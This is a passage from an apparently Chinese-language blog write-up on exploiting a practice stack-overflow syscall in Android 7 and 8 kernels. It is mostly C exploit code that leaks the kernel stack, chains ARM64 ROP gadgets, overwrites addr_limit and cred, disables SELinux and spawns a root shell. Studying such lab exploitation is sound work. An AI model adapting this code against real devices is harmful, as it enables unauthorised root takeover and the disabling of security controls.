*)&amp;write_buf[<span class="number">8</span>*<span class="number">0</span>]) = real_k_sp - <span class="number">0x110</span> + <span class="number">0x10</span>;   <span class="comment">// -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">1</span>]) = gadget2;          <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">2</span>]) = real_k_sp - <span class="number">0x110</span> + <span class="number">0x30</span>;     <span class="comment">//&lt;-sp  -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">3</span>]) = commit_cred_func;          <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">4</span>]) = init_cred_addr;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">5</span>]) = <span class="number">0x0</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">6</span>]) = real_k_sp - <span class="number">0x110</span> + <span class="number">0x48</span>;    <span class="comment">// &lt;- sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">7</span>]) = gadget2;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">8</span>]) = <span class="number">0x5</span>;       </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">9</span>]) = <span class="number">0x6</span>;    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">10</span>]) = <span class="number">0x7</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">11</span>]) = <span class="number">0</span>;        <span class="comment">// set selinux value</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">12</span>]) = selinux_enforcing_addr - <span class="number">0x14</span>;   <span class="comment">// selinux_enforcing addr</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">13</span>]) = gadget3;    <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">14</span>]) = <span class="number">0x11</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">15</span>]) = <span class="number">0x12</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">16</span>]) = <span class="number">0x13</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">17</span>]) = gadget4;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">18</span>]) = <span class="number">0x15</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">19</span>]) = <span class="number">0x16</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">20</span>]) = real_k_sp;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">21</span>]) = KERNEL_RET;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hexdump(write_buf, <span class="number">0x200</span>);</span><br><span class="line">    k_stackof_write(write_buf,<span class="number">0x110</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-8"   >
          <a href="#android-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-8" class="headerlink" title="android 8"></a>android 8</h2>
      <blockquote>
<p>内核版本：linux 3.18.94</p>
</blockquote>
<p>整体利用思路跟android 7一样，只不过这里没找到合适gadget，所以不再在内核中执行commit_creds()，而是先改addr_limit，然后回用户态通过pipe任意内核读写完成提权。</p>
<p>利用思路：</p>
<ol>
<li>通过 stackof_read() 泄露内核栈地址（高地址）</li>
<li>通过 stackof_write() 将gadget布置到内核栈中，同时覆盖栈中的返回地址达成控制流劫持</li>
<li>系统开启PXN，无法ret2usr。所以利用rop将栈迁移到有gadget的栈空间（低地址）</li>
<li>继续rop，执行一次任意地址写，将addr_limit写成X2中存储的一个很大的值</li>
<li>再次利用rop栈迁移，使上下文跟控制流劫持之前相同（x29，x30和sp），于是可成功返回用户态</li>
<li>在用户态通过pipe任意内核地址读写，改掉当前进程的cred，关闭selinux</li>
<li>在用户态拿root shell</li>
</ol>
<p>利用控制流劫持点，寄存器中的内容，降低rop gadget的复杂度：</p>
<ul>
<li>x2的值是一个很大的值0xffffffffffffffd0，写addr_limit绰绰有余</li>
<li>x9 x10 x11等寄存器中的内容是用户态可控的</li>
</ul>
<p><img   src="image-20230906135028344.png?size=600" style="width: 600px;"  alt="image-20230906135028344"></p>
<p>找的四条gadget如下，在内核态完成了一次任意地址写（将 thread_info-&gt;addr_limit 写成了X2的值0xffffffffffffffd0）</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc0000a24e8</span>;     <span class="comment">//  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc00016fa4c</span>;     <span class="comment">//  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0003dc88c</span>;     <span class="comment">//  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000deb98</span>;     <span class="comment">//  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret</span></span><br></pre></td></tr></table></div></figure>
<p>写完addr_limit 后，返回用户态。先关闭selinux。再利用泄露的sp地址，计算 <code>thread_info-&gt;task</code> 并读出task地址。再根据task中 <code>task_struct-&gt;cred</code> 的偏移，读出cred所在地址。最后写cred，完成提权。</p>
<p>本地 root shell：</p>
<p><img   src="image-20230906135208019.png?size=600" style="width: 600px;"  alt="image-20230906135208019"></p>
<p>exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xFFFFFFC0000BF0B8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC0009C74A4</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr_limit_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_read - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_write - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc0000a24e8</span>;     <span class="comment">//  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc00016fa4c</span>;     <span class="comment">//  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0003dc88c</span>;     <span class="comment">//  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000deb98</span>;     <span class="comment">//  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffc0000845d8 : ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="comment">0xffffffc0002ff46c : ldp x19, x21, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line"><span class="comment">0xffffffc0000824d0 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line"><span class="comment">0xffffffc00008ab08 : ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0xffffffc000350160 : ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0xffffffc00016fa4c : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret</span></span><br><span class="line"><span class="comment">0xffffffc0003dc88c : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0xffffffc0000deb98 : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unsigned long gadget2 = 0xffffffc0000da954;     // : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="comment">unsigned long gadget3 = 0xffffffc0000cda00;     // :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret</span></span><br><span class="line"><span class="comment">unsigned long gadget4 = 0xffffffc0000d6ae4;     // : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x80 ; ret</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x8</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_kernel4</span><span class="params">(<span class="keyword">char</span>* k_addr, <span class="keyword">char</span>* u_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_rw[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_rw);</span><br><span class="line">    write(pipe_rw[<span class="number">1</span>],(<span class="keyword">void</span>*)u_addr,<span class="number">0x4</span>);</span><br><span class="line">    read(pipe_rw[<span class="number">0</span>],(<span class="keyword">void</span>*)k_addr,<span class="number">0x4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">char</span>* write_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(read_buf, <span class="number">0x0</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(write_buf, <span class="number">0x43</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char* test_str = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;;</span></span><br><span class="line">    <span class="comment">// strncpy(write_buf, test_str, 0x100);</span></span><br><span class="line"></span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    hexdump(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_k_sp = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x100</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;real_k_sp: 0x%lx\n&quot;</span>,real_k_sp);     </span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x100</span>]) = real_k_sp - <span class="number">0x110</span>;         <span class="comment">// kernel rop, fake kernel sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x108</span>]) = gadget1;         <span class="comment">// gadget</span></span><br><span class="line">    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">0</span>]) = <span class="number">0x0</span>;          <span class="comment">// -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">1</span>]) = gadget2;      <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">2</span>]) = <span class="number">2</span>;            <span class="comment">// &lt;-sp  -&gt;x29  </span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">3</span>]) = gadget3;      <span class="comment">// -&gt;x30</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">4</span>]) = <span class="number">4</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">5</span>]) = <span class="number">5</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">6</span>]) = <span class="number">6</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">7</span>]) = <span class="number">7</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">8</span>]) = <span class="number">8</span>;       </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">9</span>]) = <span class="number">9</span>;    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">10</span>]) = <span class="number">10</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">11</span>]) = <span class="number">11</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">12</span>]) = <span class="number">12</span>;   </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">13</span>]) = <span class="number">13</span>;    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">14</span>]) = <span class="number">14</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">15</span>]) = <span class="number">15</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">16</span>]) = <span class="number">16</span>;          <span class="comment">// &lt;-sp  -&gt;x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">17</span>]) = gadget4;     <span class="comment">// -&gt;x30  </span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">8</span>*<span class="number">18</span>]) = <span class="number">18</span>;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> 